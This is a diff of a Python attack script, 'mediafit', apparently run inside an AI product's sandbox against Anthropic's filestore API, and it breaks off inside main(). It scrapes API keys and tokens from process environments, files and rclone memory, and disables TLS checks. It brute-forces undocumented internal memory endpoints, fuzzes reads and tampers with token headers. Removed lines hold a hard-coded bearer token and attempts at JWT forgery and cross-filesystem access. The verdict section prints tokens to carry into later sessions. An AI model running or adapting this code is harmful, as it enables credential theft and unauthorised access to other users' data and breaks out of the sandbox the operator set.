@@ -1,80 +1,101 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit v2.17.0 -- forge battery (never run before), memory service, range fuzz, createFile fix."""
-import os, sys, json, re, time, ssl, base64, hashlib, hmac, socket, subprocess, traceback
+"""mediafit v2.18.0 -- /v1/internal namespace, credential hunt, token fix, media_type, range."""
+import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
 import urllib.request, urllib.error
 
-VER  = "2.17.0"
+VER  = "2.18.0"
 API  = "https://api.anthropic.com"
 FS   = API + "/v1/filestore/fs/"
 CONF = "/dev/shm/rclone-boot/config.json"
 OUTD = "/mnt/user-data/outputs"; UP = "/mnt/user-data/uploads"
 
-PREV_FSID  = "claude_chat_01F9i9oCedFVLXKQ831hgXhw"
-PREV_TOKEN = ("eyJhbGciOiJFUzI1NiIsImtpZCI6IktwbFRxWHVCODJRRzJ3ZHVxRnlHRXNnSDZuNDkzekVzZkg4cUhkWHFmaUEiLCJ0eXAiOiJKV1QifQ."
- "eyJhY2NvdW50X3V1aWQiOiI5NWZlYTkxMi1hYzMzLTQxYTctYTRjMC0xNWQ0YTJkZmQxNTIiLCJhbGxvd2VkX3Jvb3RzIjpbIi9vdXRwdXRzIl0sImF1ZCI6WyJmaWxlc3RvcmUiXSwiY2xhdWRlX3ByZXNlbnRlZCI6dHJ1ZSwiZXhwIjoxNzkyNDcyNzk1LCJmaWxlc3lzdGVtX2lkIjoiY2xhdWRlX2NoYXRfMDFGOWk5b0NlZEZWTFhLUTgzMWhnWGh3IiwiaWF0IjoxNzkyNDUxMTk1LCJpc3MiOiJmaWxlc3RvcmUtY2xpIiwib3JnX3V1aWQiOiJmMTQwMjRmNS1hZDV3LTRmNDEtYWZiNy1iOTMyOTBmZTRmMTAiLCJvcmdhbml6YXRpb25fdXVpZCI6ImYxNDAyNGY1LWFkNTctNGY0MS1hZmI3LWI5MzI5MGZlNGYxMCIsInJlc29sdmVkX3dvcmtzcGFjZV90YWdnZWRfaWQiOiJ3cmtzcGNfMDFING1aV3BHbUxVSHZ2Mld4ZzZLbXdvIiwic3ViIjoiOTVmZWE5MTItYWMzMy00MWE3LWE0YzAtMTVkNGEyZGZkMTUyIiwid29ya3NwYWNlX2NtZWtfZW5hYmxlZCI6ZmFsc2UsIndvcmtzcGFjZV90YWdnZWRfaWQiOiJkZWZhdWx0Iiwid29ya3NwYWNlX3V1aWQiOiI4MjE4ZTk0Yi03MDU3LTQ2NTUtYTQ4Ni0wNGZkOWI5ODYxNWEifQ."
- "Lpmk0it8xA02UUHMddf8u7Q9_7xw-tctkOk3tArf3wVgumNO-o7A44EZtQG5Wy1rLmK5dU_4DOYCuXh4vM4QNg")
-ACCOUNT1_UUID = "95fea912-ac33-41a7-a4c0-15d4a2dfd152"
-
 OUT, G = [], {}
 def w(s=""): print(s, flush=True); OUT.append(str(s))
-def head(t): w("\n" + "="*70 + "\n### " + t + "\n" + "="*70)
+def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
 P,F,U,I = [],[],[],[]
 def rec(k,m,ev=None):
-    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k] + " " + m)
-    if ev is not None: w("        " + str(ev)[:1300])
+    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
+    if ev is not None: w("        "+str(ev)[:1200])
     {"P":P,"F":F,"U":U,"I":I}[k].append(m)
 def sh(a,t=40):
     try:
-        p = subprocess.run(a, capture_output=True, timeout=t)
-        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
+        p=subprocess.run(a,capture_output=True,timeout=t)
+        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
     except Exception as e: return -1,"","EXC:%s"%e
-def b64d(x): return base64.urlsafe_b64decode(x + "="*(-len(x)%4))
+def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
 def b64e(x):
-    if isinstance(x,(dict,list)): x = json.dumps(x,separators=(",",":"))
-    x = x if isinstance(x,bytes) else x.encode()
+    if isinstance(x,(dict,list)): x=json.dumps(x,separators=(",",":"))
+    x=x if isinstance(x,bytes) else x.encode()
     return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
 def step(n,f):
     try: f()
     except Exception as e:
-        w("    !! %s: %s" % (n,e)); w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
-_CTX = ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
-def http(url, method="POST", token=None, body=None, t=15, hdrs=None, cap=400000):
-    h = {"User-Agent":"mediafit/"+VER}
-    if token: h["Authorization"] = "Bearer " + token
-    if body is not None and not isinstance(body,bytes): body = json.dumps(body).encode()
+        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
+_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
+def http(url,method="POST",token=None,body=None,t=15,hdrs=None,cap=500000):
+    h={"User-Agent":"mediafit/"+VER}
+    if token: h["Authorization"]="Bearer "+token
+    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
     if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
     if hdrs: h.update(hdrs)
-    req = urllib.request.Request(url, method=method, headers=h, data=body)
+    req=urllib.request.Request(url,method=method,headers=h,data=body)
     try:
-        r = urllib.request.urlopen(req, timeout=t, context=_CTX)
-        return r.status, r.read(cap), dict(r.headers)
+        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap),dict(r.headers)
     except urllib.error.HTTPError as e:
-        try: return e.code, e.read(), dict(e.headers)
-        except Exception: return e.code, b"", {}
-    except Exception as e: return None, ("ERR:%s"%e).encode(), {}
-def api(m,p,tk=None,t=15): 
-    s,b,_ = http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
+        try: return e.code,e.read(),dict(e.headers)
+        except Exception: return e.code,b"",{}
+    except Exception as e: return None,("ERR:%s"%e).encode(),{}
+def api(m,p,tk=None,t=15):
+    s,b,_=http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
 
 # ------------------------------------------------------------------ 1
-def s_env():
-    head("1. ENV + /v1/status")
-    try: G["fsid"] = [m["filesystem_id"] for m in json.loads(open(CONF).read())["mounts"] if m.get("filesystem_id")][0]
-    except Exception as e: rec("U","config: %s"%e)
-    for m,tk in [("GET",None)]:
-        for u in [API+"/v1/status", API+"/status"]:
-            st,b,_ = http(u,"GET",None,None,6)
-            w("    %-34s -> %s %s" % (u, st, b[:200].decode("utf-8","replace")))
-    rc,o,_ = sh(["sh","-c","ls -la /mnt/attach /opt/rclone-attach 2>&1 | head -20"])
-    w("    attach dirs: %s" % o.strip()[:300])
+def s_creds():
+    head("1. CREDENTIAL HUNT  <== key to /v1/internal")
+    hits={}
+    PATS=[rb"sk-ant-[A-Za-z0-9_\-]{20,}", rb"sk-ant-oat[A-Za-z0-9_\-]{10,}",
+          rb"[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}"]
+    ENV=[b"ANTHROPIC",b"CLAUDE",b"API_KEY",b"OAUTH",b"TOKEN",b"MEMORY",b"INTERNAL"]
+    # env of every process
+    for p in os.listdir("/proc"):
+        if not p.isdigit(): continue
+        try: e=open("/proc/%s/environ"%p,"rb").read()
+        except Exception: continue
+        for kv in e.split(b"\x00"):
+            if any(k in kv for k in ENV) and kv.strip():
+                hits.setdefault("ENV",set()).add(kv.decode("utf-8","replace")[:160])
+    for k in sorted(hits.get("ENV",set()))[:40]: w("    ENV %s"%k)
+    # files
+    for root in ["/dev/shm","/root","/etc","/var/lib","/var/run","/opt","/home","/tmp","/mnt"]:
+        for dp,dn,fn in os.walk(root):
+            if dp.count("/")>7: dn[:]=[]
+            for f in fn[:70]:
+                fp=os.path.join(dp,f)
+                try:
+                    if os.path.getsize(fp)>4_000_000: continue
+                    d=open(fp,"rb").read()
+                except Exception: continue
+                for pat in PATS:
+                    for m in re.findall(pat,d):
+                        if len(m)>30: hits.setdefault("FILE",set()).add("%s :: %s"%(fp,m.decode()[:120]))
+    for k in sorted(hits.get("FILE",set()))[:40]: w("    FILE %s"%k)
+    G["CREDS"]=hits
+    # config.json full dump
+    try:
+        c=json.loads(open(CONF).read())
+        w("    config keys: %s"%list(c.keys()))
+        w("    config: %s"%json.dumps(c)[:1200])
+    except Exception as e: w("    config: %s"%e)
+    rec("P" if hits else "U","credential artifacts found: %s"%
+        {k:len(v) for k,v in hits.items()})
 
 # ------------------------------------------------------------------ 2
-def s_tokens_full():
-    head("2. FULL TOKEN DUMP (find the invalid-signature one)")
-    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
-    TK = []
+def s_tokens():
+    head("2. TOKENS (normalise signature to 86 chars)")
+    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
+    TK=[]
     def add(t):
-        t = t.decode() if isinstance(t,bytes) else t
+        t=t.decode() if isinstance(t,bytes) else t
         if t.startswith("eyJ") and t not in TK: TK.append(t)
     for p in os.listdir("/proc"):
         if p.isdigit():
@@ -85,222 +106,176 @@ def s_tokens_full():
         if not p.isdigit(): continue
         try:
             if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
-            maps = open("/proc/%s/maps"%p).read().splitlines(); mem = open("/proc/%s/mem"%p,"rb",0)
+            maps=open("/proc/%s/maps"%p).read().splitlines(); mem=open("/proc/%s/mem"%p,"rb",0)
         except Exception: continue
         for line in maps:
-            try: a,perms = line.split()[0], line.split()[1]
+            try: a,perms=line.split()[0],line.split()[1]
             except Exception: continue
             if "r" not in perms: continue
-            try: s0,e0 = [int(x,16) for x in a.split("-")]
+            try: s0,e0=[int(x,16) for x in a.split("-")]
             except Exception: continue
-            if not (0 < e0-s0 <= 256*1024*1024): continue
-            try: mem.seek(s0); d = mem.read(e0-s0)
+            if not (0<e0-s0<=256*1024*1024): continue
+            try: mem.seek(s0); d=mem.read(e0-s0)
             except Exception: continue
             for m in JWT.findall(d): add(m)
-    TD = []
+    TD=[]
     for t in TK:
-        try:
-            h,p,s = t.split("."); hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
-            TD.append({"tok":t,"hdr":hdr,"pl":pl,"siglen":len(s)})
-        except Exception: pass
-    G["TD"] = TD
-    w("    raw tokens=%d" % len(TD))
-    for i,r in enumerate(TD):
-        st,b = api("listDirectory", {"filesystem_id": G.get("fsid"), "path":"/outputs"}, r["tok"])
-        tag = "VALID" if st==200 else ("SIG-BAD" if b and b"signature" in b else str(st))
-        w("    [%d] %-8s alg=%s kid=%s siglen=%d roots=%s fsid=%s" %
-          (i, tag, r["hdr"].get("alg"), str(r["hdr"].get("kid"))[:10], r["siglen"],
-           r["pl"].get("allowed_roots"), r["pl"].get("filesystem_id")))
-        if tag == "SIG-BAD":
-            w("         FULL CLAIMS: %s" % json.dumps(r["pl"])[:700])
-            w("         FULL HEADER: %s" % json.dumps(r["hdr"])[:300])
-    G["TOKEN"] = next((r["tok"] for r in TD if "/outputs" in (r["pl"].get("allowed_roots") or [])), TD[0]["tok"] if TD else None)
-    G["CLAIMS"] = next((r["pl"] for r in TD if r["tok"]==G["TOKEN"]), {})
-    G["ALLTOK"] = [r["tok"] for r in TD]
-    rec("P" if G["TOKEN"] else "F", "tokens=%d acct=%s" % (len(TD), str(G["CLAIMS"].get("account_uuid"))[:8]))
+        parts=t.split(".")
+        for variant in ([t] if len(parts[2])==86 else [t, parts[0]+"."+parts[1]+"."+parts[2][:86]]):
+            try:
+                h,p,s=variant.split("."); hdr=json.loads(b64d(h)); pl=json.loads(b64d(p))
+                TD.append({"tok":variant,"hdr":hdr,"pl":pl})
+            except Exception: pass
+    # dedupe by payload+validity
+    good=[]
+    for r in TD:
+        st,b=api("listDirectory",{"filesystem_id":r["pl"].get("filesystem_id"),"path":"/outputs"},r["tok"])
+        r["st"]=st
+        if st==200 or (b and b"not permitted" in b): good.append(r)
+    w("    candidates=%d  accepted=%d"%(len(TD),len(good)))
+    for r in good:
+        w("    OK roots=%-16s ro=%-5s iss=%-16s tok=...%s"%(
+            r["pl"].get("allowed_roots"), r["pl"].get("readonly"), r["pl"].get("iss"), r["tok"][-14:]))
+    G["TD"]=good
+    G["TOKEN"]=next((r["tok"] for r in good if "/outputs" in (r["pl"].get("allowed_roots") or [])),
+                    good[0]["tok"] if good else None)
+    G["UPLOAD"]=next((r["tok"] for r in good if (r["pl"].get("allowed_roots") or [])==["/uploads"]), None)
+    G["CLAIMS"]=next((r["pl"] for r in good if r["tok"]==G["TOKEN"]), {})
+    G["fsid"]=G["CLAIMS"].get("filesystem_id")
+    w("    fsid=%s acct=%s uploads-token=%s"%(G.get("fsid"),G["CLAIMS"].get("account_uuid"),
+                                              "yes" if G["UPLOAD"] else "NO"))
+    rec("P" if G["TOKEN"] else "F","valid tokens=%d uploads=%s"%(len(good),"yes" if G["UPLOAD"] else "no"))
 
 # ------------------------------------------------------------------ 3
-def s_forge():
-    head("3. FORGE BATTERY  <== NEVER TESTED BEFORE")
-    T = G.get("TOKEN")
-    if not T: rec("U","no token"); return
-    h,p,s = T.split(".")
-    hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
-    own = G.get("fsid")
-    def probe(label, tok, fsid=None):
-        st,b = api("listDirectory", {"filesystem_id": fsid or own, "path":"/outputs"}, tok)
-        w("    %-38s -> %s %s" % (label, st, b[:150].decode("utf-8","replace")))
-        return st
-    # --- 3a: modify payload, KEEP old signature. If 200 -> signature not verified
-    p2 = dict(pl); p2["allowed_roots"] = ["/"]
-    st = probe("keep-sig + roots=[/]", b64e(hdr)+"."+b64e(p2)+"."+s)
-    if st == 200: rec("P","*** SIGNATURE NOT VERIFIED -> FULL FORGERY ***")
-    # --- 3b: the money test - foreign fsid in payload, old signature
-    if PREV_FSID and PREV_FSID != own:
-        p3 = dict(pl); p3["filesystem_id"] = PREV_FSID
-        st = probe("keep-sig + FOREIGN fsid", b64e(hdr)+"."+b64e(p3)+"."+s)
-        if st == 200: rec("P","*** FORGED FSID ACCEPTED -> CROSS-FS ***")
-    # --- 3c: alg=none
-    for alg in ["none","None","NONE"]:
-        probe("alg=%s empty sig" % alg,
-              b64e({"alg":alg,"typ":"JWT"})+"."+b64e(p2)+".")
-    # --- 3d: JWKS hunt
-    key = None
-    for u in ["/.well-known/jwks.json","/v1/.well-known/jwks.json","/.well-known/openid-configuration",
-              "/v1/oauth/jwks","/jwks.json","/.well-known/jwks","/v1/filestore/.well-known/jwks.json"]:
-        st,b,_ = http(API+u,"GET",None,None,7)
-        if st not in (404,None):
-            w("    GET %-42s -> %s %s" % (u, st, b[:200].decode("utf-8","replace")))
-        if st == 200:
-            try:
-                j = json.loads(b)
-                for k in (j.get("keys") or []):
-                    if k.get("kty")=="EC" and k.get("x") and k.get("y"):
-                        key = k; G["JWKS"]=k; rec("P","JWKS EC key found", str(k)[:200]); break
-            except Exception: pass
-        if key: break
-    # --- 3e: HS256 confusion with the public key as HMAC secret
-    if key:
-        x = b64d(key["x"]); y = b64d(key["y"])
-        pre = bytes.fromhex("3059301306072a8648ce3d020106082a8648ce3d030107034200")
-        der = pre + b"\x04" + x + y
-        pem = ("-----BEGIN PUBLIC KEY-----\n" +
-               "\n".join(base64.encodebytes(der).decode().strip().split("\n")) +
-               "\n-----END PUBLIC KEY-----\n")
-        for name, sec in {"raw x||y":x+y, "04||x||y":b"\x04"+x+y, "DER":der, "PEM":pem.encode(),
-                          "kid":(hdr.get("kid") or "").encode(), "b64":b64e(x+y).encode()}.items():
-            hh = {"alg":"HS256","typ":"JWT","kid":hdr.get("kid")}
-            sig = hmac.new(sec, (b64e(hh)+"."+b64e(p2)).encode(), hashlib.sha256).digest()
-            if probe("HS256 confusion [%s]" % name, b64e(hh)+"."+b64e(p2)+"."+b64e(sig)) == 200:
-                rec("P","*** HS256 CONFUSION WORKS via %s ***" % name)
-    else:
-        rec("U","no JWKS -> HS256 confusion untestable")
-    # --- 3f: kid tamper / exp strip / extra claims
-    probe("kid tampered", b64e({**hdr,"kid":"A"*43})+"."+p+"."+s)
-    probe("exp removed + old sig", b64e(hdr)+"."+b64e({k:v for k,v in pl.items() if k!="exp"})+"."+s)
+def s_internal():
+    head("3. /v1/internal/ NAMESPACE  <== THE LEAD")
+    tk=G.get("TOKEN")
+    if not tk: rec("U","no token"); return
+    bases=["/v1/internal/","/v1/internal"]
+    svcs=["anthropic.memory.api.v1alpha.MemoryInternalService",
+          "anthropic.filestore.v1alpha.Filesystem",
+          "anthropic.filestore.v1alpha.filesystem",
+          "anthropic.filestore.v1alpha.Filestore",
+          "anthropic.errors.v1alpha.ErrorService"]
+    meths=["ListMemories","ReadMemoryByPath","WriteMemory","MoveMemory","DeleteMemoryByPath",
+           "listDirectory","readFile","ListDirectory","ReadFile","createFile",
+           "reassignFilesystem","importFiles","listFilesystems"]
+    AUTH=[("none",{}),("bearer-fs",{"Authorization":"Bearer "+tk}),
+          ("x-api-key",{"x-api-key":tk}),
+          ("bearer+ver",{"Authorization":"Bearer "+tk,"anthropic-version":"2023-06-01"}),
+          ("x-api-key+ver",{"x-api-key":tk,"anthropic-version":"2023-06-01"})]
+    seen=set(); live=[]
+    for b in bases:
+        for s in svcs:
+            for m in meths:
+                url=API+b+"/"+s+"/"+m
+                if url in seen: continue
+                seen.add(url)
+                for an,ah in AUTH:
+                    st,bo,_=http(url,"POST",None,{"filesystem_id":G.get("fsid"),"path":"/outputs"},8,
+                                 {**ah,"Connect-Protocol-Version":"1"})
+                    if st not in (404,None):
+                        key="%s|%s|%s|%s"%(b,s,m,an)
+                        msg=bo[:170].decode("utf-8","replace")
+                        w("    %-62s %-9s -> %s %s"%(b+"/"+s.split(".")[-1]+"/"+m,an,st,msg))
+                        live.append((b,s,m,an,st))
+                        break
+    G["INTERNAL"]=live
+    rec("P" if live else "F","internal endpoints responding: %d"%len(live))
+    # also probe bare prefixes
+    for u in ["/v1/internal","/v1/internal/","/v1/internal/anthropic.memory.api.v1alpha.MemoryInternalService"]:
+        st,bo,_=http(API+u,"GET",None,None,7)
+        w("    GET %-56s -> %s %s"%(u,st,bo[:120].decode("utf-8","replace")))
 
 # ------------------------------------------------------------------ 4
-def s_memory():
-    head("4. MEMORY SERVICE  <== brand new surface")
-    svc = "/anthropic.memory.api.v1alpha.MemoryInternalService/"
-    bases = ["", "/v1", "/v1/memory", "/v1/memory/api", "/api", "/internal",
-             "/v1/filestore", "/v1/filestore/mem", "/v1/internal"]
-    meths = ["ListMemories","ReadMemoryByPath","WriteMemory","MoveMemory","DeleteMemoryByPath"]
-    tk = G.get("TOKEN")
-    for b in bases:
-        for m in meths:
-            for auth in [tk, None]:
-                st,bo,_ = http(API + b + svc + m, "POST", auth, {}, 7,
-                               {"Connect-Protocol-Version":"1"})
-                if st not in (404,None):
-                    w("    %-24s %-20s auth=%-5s -> %s %s" %
-                      (b or "(root)", m, "yes" if auth else "no", st,
-                       bo[:170].decode("utf-8","replace")))
-                    if st == 200: rec("P","MEMORY LIVE: %s%s%s" % (b, svc, m))
-    # short-form guesses
-    for u in ["/v1/memory/listMemories","/v1/mem/fs/listMemories","/v1/memory/api/listMemories",
-              "/v1/filestore/mem/listMemories"]:
-        st,bo,_ = http(API+u,"POST",tk,{},7,{"Connect-Protocol-Version":"1"})
-        if st not in (404,None): w("    %-38s -> %s %s" % (u,st,bo[:150].decode("utf-8","replace")))
+def s_write():
+    head("4. createFile + media_type")
+    tk=G.get("TOKEN"); own=G.get("fsid")
+    if not tk: rec("U","no token"); return
+    B="----mf"+b64e(os.urandom(6))
+    def mp(params,fn,fd):
+        o=("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n"
+           "Content-Type: application/json\r\n\r\n"%B).encode()
+        o+=json.dumps(params).encode()+b"\r\n"
+        o+=("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
+            "Content-Type: application/octet-stream\r\n\r\n"%B).encode()+fd+b"\r\n"
+        return o+("--%s--\r\n"%B).encode()
+    H={"Content-Type":"multipart/form-data; boundary="+B,"Connect-Protocol-Version":"1"}
+    api("makeDirectory",{"filesystem_id":own,"path":"/outputs"},tk)
+    for lbl,pr in [("text",{"filesystem_id":own,"path":"/outputs/mf.txt","media_type":"text/plain"}),
+                   ("json",{"filesystem_id":own,"path":"/outputs/mf.json","media_type":"application/json"})]:
+        st,bo,_=http(FS+"createFile","POST",tk,mp(pr,"f",b"MEDIAFIT-WRITE-OK"),25,H)
+        w("    createFile[%s] -> %s %s"%(lbl,st,bo[:260].decode("utf-8","replace")))
+        if st==200: rec("P","*** createFile WORKS (%s) ***"%lbl)
+    st,bo=api("listDirectory",{"filesystem_id":own,"path":"/outputs"},tk)
+    w("    listDirectory /outputs -> %s %s"%(st,bo[:900].decode("utf-8","replace")))
+    if bo not in (b"{}",b""): rec("P","listDirectory RETURNS ENTRIES: %s"%bo[:200])
+    for m in ["mf.txt","mf.json"]:
+        st,bo=api("readFile",{"filesystem_id":own,"path":"/outputs/"+m},tk)
+        w("    readFile /outputs/%-9s -> %s %s"%(m,st,bo[:150].decode("utf-8","replace")))
+        if st==200: rec("P","read-back OK: %s"%m)
 
 # ------------------------------------------------------------------ 5
-def s_createfile():
-    head("5. createFile FIX (params part needs its own Content-Type)")
-    tk = G.get("TOKEN"); own = G.get("fsid")
-    B = "----mf" + b64e(os.urandom(6))
-    def mp(params, fname=None, fdata=None, pct=True):
-        o = ("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n" % B).encode()
-        if pct: o += b"Content-Type: application/json\r\n"
-        o += b"\r\n" + json.dumps(params).encode() + b"\r\n"
-        if fname:
-            o += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
-                  "Content-Type: application/octet-stream\r\n\r\n" % (B, fname)).encode() + fdata + b"\r\n"
-        return o + ("--%s--\r\n" % B).encode()
-    H = {"Content-Type":"multipart/form-data; boundary="+B, "Connect-Protocol-Version":"1"}
-    api("makeDirectory", {"filesystem_id":own,"path":"/outputs"}, tk)
-    for lbl, pr, pct in [("params+ct", {"filesystem_id":own,"path":"/outputs/mf.txt"}, True),
-                         ("params no-ct", {"filesystem_id":own,"path":"/outputs/mf2.txt"}, False)]:
-        st,b,_ = http(FS+"createFile","POST",tk, mp(pr,"mf.txt",b"HELLO-MEDIAFIT",pct), 20, H)
-        w("    createFile[%s] -> %s %s" % (lbl, st, b[:300].decode("utf-8","replace")))
-        if st == 200: rec("P","createFile WORKS (%s)" % lbl)
-    st,b = api("listDirectory", {"filesystem_id":own,"path":"/outputs"}, tk)
-    w("    listDirectory /outputs -> %s %s" % (st, b[:800].decode("utf-8","replace")))
-    for m in ["mf.txt","mf2.txt"]:
-        st,b = api("readFile", {"filesystem_id":own,"path":"/outputs/"+m}, tk)
-        w("    readFile /outputs/%-9s -> %s %s" % (m, st, b[:150].decode("utf-8","replace")))
+def s_range():
+    head("5. readFile RANGE FUZZ (valid uploads token)")
+    up=G.get("UPLOAD"); own=G.get("fsid")
+    if not up: rec("U","no valid uploads token"); return
+    try: png=sorted(x for x in os.listdir(UP) if x.lower().endswith((".png",".jpg",".jpeg")))[0]
+    except Exception: rec("U","no uploads file"); return
+    lsz=os.path.getsize(os.path.join(UP,png)); G["PNG"]=png
+    st,b,_=http(FS+"readFile","POST",up,{"filesystem_id":own,"path":"/uploads/"+png},25,
+                {"Connect-Protocol-Version":"1"})
+    w("    local=%d api=%s len=%d head=%r"%(lsz,st,len(b),b[:120]))
+    if st!=200: return
+    rec("P","readFile baseline 200 (uploads token now valid)")
+    for lbl,extra in [("start0 end16",{"range":{"start":0,"end":16}}),
+                      ("offset/len",{"range":{"offset":0,"length":16}}),
+                      ("beyond EOF",{"range":{"start":max(0,lsz-8),"end":lsz+300}}),
+                      ("past end",{"range":{"start":lsz+1000,"end":lsz+1100}}),
+                      ("end<start",{"range":{"start":50,"end":10}}),
+                      ("flat s/e",{"start":0,"end":16})]:
+        body={"filesystem_id":own,"path":"/uploads/"+png}; body.update(extra)
+        st2,b2,_=http(FS+"readFile","POST",up,body,25,{"Connect-Protocol-Version":"1"})
+        w("    %-14s -> %s len=%d %s"%(lbl,st2,len(b2),b2[:100].decode("utf-8","replace")))
+        if st2==200 and lbl in ("beyond EOF","past end"):
+            rec("I","%s returned %d bytes"%(lbl,len(b2)))
 
 # ------------------------------------------------------------------ 6
-def s_range():
-    head("6. readFile RANGE FUZZ (out-of-bounds leak)")
-    up = next((r["tok"] for r in G.get("TD",[]) if r["pl"].get("allowed_roots")==["/uploads"]), None)
-    own = G.get("fsid")
-    try:
-        png = sorted(x for x in os.listdir(UP) if x.lower().endswith((".png",".jpg")))[0]
-    except Exception: rec("U","no uploads file"); return
-    lsz = os.path.getsize(os.path.join(UP, png))
-    st, b, hd = http(FS+"readFile","POST",up,{"filesystem_id":own,"path":"/uploads/"+png},20,
-                     {"Connect-Protocol-Version":"1"})
-    w("    local size=%d  api status=%s  api bytes=%d  ctype=%s" % (lsz, st, len(b), hd.get("Content-Type")))
-    w("    raw head: %r" % b[:160])
-    G["PNG"] = png
-    for lbl, extra in [("range start0 end16", {"range":{"start":0,"end":16}}),
-                       ("range off0 len16",  {"range":{"offset":0,"length":16}}),
-                       ("range beyond EOF",  {"range":{"start":lsz-8,"end":lsz+200}}),
-                       ("range past end",    {"range":{"start":lsz+1000,"end":lsz+1100}}),
-                       ("range end<start",   {"range":{"start":50,"end":10}}),
-                       ("flat start/end",    {"start":0,"end":16})]:
-        body = {"filesystem_id":own,"path":"/uploads/"+png}; body.update(extra)
-        st2,b2,_ = http(FS+"readFile","POST",up,body,20,{"Connect-Protocol-Version":"1"})
-        w("    %-20s -> %s len=%d %s" % (lbl, st2, len(b2), b2[:110].decode("utf-8","replace")))
-        if st2 == 200 and len(b2) > 0 and lbl.startswith("range beyond"):
-            rec("I","range beyond EOF returned %d bytes (local %d)" % (len(b2), lsz))
-
-# ------------------------------------------------------------------ 7
-def s_other_methods():
-    head("7. UNDISCOVERED METHODS ON ALT PREFIXES")
-    tk = G.get("TOKEN"); own = G.get("fsid")
-    pfxs = ["/v1/filestore/fs/","/v1/filestore/","/v1/filestore/files/","/v1/filestore/admin/"]
-    meths = ["reassignFilesystem","importFiles","signC2PA","verifyC2PA","listFiles",
-             "getFilesystem","listFilesystems","getFilesystemUsage","stat"]
-    for p in pfxs:
-        for m in meths:
-            st,b,_ = http(API+p+m,"POST",tk,{"filesystem_id":own,"path":"/outputs"},7,
-                          {"Connect-Protocol-Version":"1"})
-            if st not in (404,None):
-                w("    %-24s %-20s -> %s %s" % (p,m,st,b[:160].decode("utf-8","replace")))
-                if st==200: rec("P","method %s live at %s" % (m,p))
-
-# ------------------------------------------------------------------ 8
-def s_matrix():
-    head("8. CROSS-FS (re-confirm with live tokens)")
-    own = G.get("fsid")
-    for lbl,t,f in [("own x own", G.get("TOKEN"), own),
-                    ("own x PREV", G.get("TOKEN"), PREV_FSID),
-                    ("PREV x own", PREV_TOKEN, own),
-                    ("PREV x PREV", PREV_TOKEN, PREV_FSID)]:
-        if not t or not f: continue
-        st,b = api("listDirectory", {"filesystem_id":f,"path":"/outputs"}, t)
-        w("    %-14s -> %s %s" % (lbl, st, b[:110].decode("utf-8","replace")))
+def s_kid():
+    head("6. kid / jku behaviour")
+    tk=G.get("TOKEN")
+    if not tk: return
+    h,p,s=tk.split("."); hdr=json.loads(b64d(h)); pl=json.loads(b64d(p))
+    own=G.get("fsid")
+    def probe(lbl,tok):
+        st,b=api("listDirectory",{"filesystem_id":own,"path":"/outputs"},tok)
+        w("    %-34s -> %s %s"%(lbl,st,b[:130].decode("utf-8","replace"))); return st
+    probe("kid removed", b64e({k:v for k,v in hdr.items() if k!="kid"})+"."+p+"."+s)
+    probe("kid empty", b64e({**hdr,"kid":""})+"."+p+"."+s)
+    probe("kid = correct (control)", b64e(hdr)+"."+p+"."+s)
+    # jku support?
+    probe("hdr + jku (garbage sig)", b64e({**hdr,"jku":"https://example.com/jwks.json"})+"."+p+"."+s)
+    probe("hdr + jku + no kid", b64e({**hdr,"jku":"https://example.com/jwks.json","kid":""})+"."+p+"."+s)
 
 def s_verdict():
     head("VERDICT")
-    w("  PASS %d: %s" % (len(P),P)); w("  UNK %d: %s" % (len(U),U))
-    w("  acct=%s fsid=%s" % (G["CLAIMS"].get("account_uuid"), G.get("fsid")))
+    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
+    w("  internal endpoints: %s"%(G.get("INTERNAL") or "none"))
+    w("  fsid=%s acct=%s"%(G.get("fsid"),G["CLAIMS"].get("account_uuid")))
     w("\n  ---- CARRY-OVER ----")
-    w("PREV_FSID  = %r" % (G.get("fsid") or ""))
-    w("PREV_TOKEN = %r" % (G.get("TOKEN") or ""))
-    w("ACCOUNT1_UUID = %r" % (G["CLAIMS"].get("account_uuid") or ""))
+    w("PREV_FSID  = %r"%(G.get("fsid") or ""))
+    w("PREV_TOKEN = %r"%(G.get("TOKEN") or ""))
+    w("ACCOUNT1_UUID = %r"%(G["CLAIMS"].get("account_uuid") or ""))
 
 def main():
-    for n,f in [("env",s_env),("tokens",s_tokens_full),("forge",s_forge),("memory",s_memory),
-                ("createfile",s_createfile),("range",s_range),("other",s_other_methods),
-                ("matrix",s_matrix),("verdict",s_verdict)]:
